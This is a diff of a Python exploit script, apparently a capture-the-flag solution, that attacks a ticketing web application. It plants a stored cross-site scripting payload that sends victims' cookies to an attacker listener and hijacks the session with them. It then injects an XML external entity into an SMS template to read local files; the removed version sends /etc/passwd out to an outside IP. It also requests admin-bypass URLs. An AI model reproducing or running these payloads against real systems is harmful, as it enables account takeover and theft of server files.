@@ -119,8 +119,10 @@ class WebExp:
         self.login_test()
 
         rs = self.session.get(self.url + 'tickets')
+        payload='b=document.cookie;a="<img src=http://{}:8234/"+btoa(b)+">";document.write(a);'.format(ip)
+        payload=base64.b16encode(payload)
         #token = self._get_token(rs.text)
-        payload = '![dsa](x"onerror=eval(atob(\'Yj1kb2N1bWVudC5jb29raWU7YT0iPGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MjM0LyIrYnRvYShiKSsiPiI7ZG9jdW1lbnQud3JpdGUoYSk7\'))%")'
+        payload = '![dsa](x"onerror=eval(atob(\'{}\'))%")'.format(payload)
         #print self.url + 'tickets/create'
         rs=self.session.get(self.url + 'tickets/create')
         token=self._get_token(rs.text)
@@ -140,14 +142,12 @@ class WebExp:
             buf=con.recv(1024)
             if 'GET' in buf:
                 break
-
         cookie=re.search(r'/\w+=*\s',buf).string
         cookie=cookie.strip().split('/')[1]
         cookie=base64.b64decode(cookie)
         value=re.search(r'"(.+)"', cookie)
         if value:
             value=value.group(1)
-
 
         self.session.cookies.set('username',None)
         self.session.cookies.set('username', value)
@@ -160,26 +160,22 @@ class WebExp:
         rs=self.session.post(url=self.url+'settings/sms',data={
             self.csrfname: token,
             "force_phone_check": "on",
-            "api_url":"http://10.85.6.104:8848/sms.php",
+            "api_url":"http://127.0.0.1:8200/api/send_sms",
             "method":"1",
             "name":"data",
             "template":u'''
             <?xml version="1.0" encoding="utf-8"?>
-            <!DOCTYPE ANY [
-            <!ENTITY % file SYSTEM "file:///etc/passwd">
-            <!ENTITY % xxe SYSTEM "http://169.254.200.186:8235/?%file;" >
+            <!DOCTYPE xdsec [ <!ENTITY xxe SYSTEM "file:///tmp/flag" >
             ]>
-            % xxe;
-            % send
-            <root>;
+            <root>
                 <tel>{tel}</tel>
-                <text>【VYG乐购】您的验证码为： {code} </text>
+            <text>【VYG乐购】您的验证码为： {code} &xxe;</text>
             </root>
             '''
         })
         #print rs.text
-        print "soluntion1:"+self.session.get('http://127.0.0.1:8233/user/check/regen').text
-        print "soluntion2:"+self.session.get('http://127.0.0.1:8233/user/2?super_admin_mode=1').text
+        print "soluntion1:"+self.session.get(self.url+'user/check/regen').text
+        print "soluntion2:"+self.session.get(self.url+'user/2?super_admin_mode=1').text
         return True
 
 def exp(host, port):
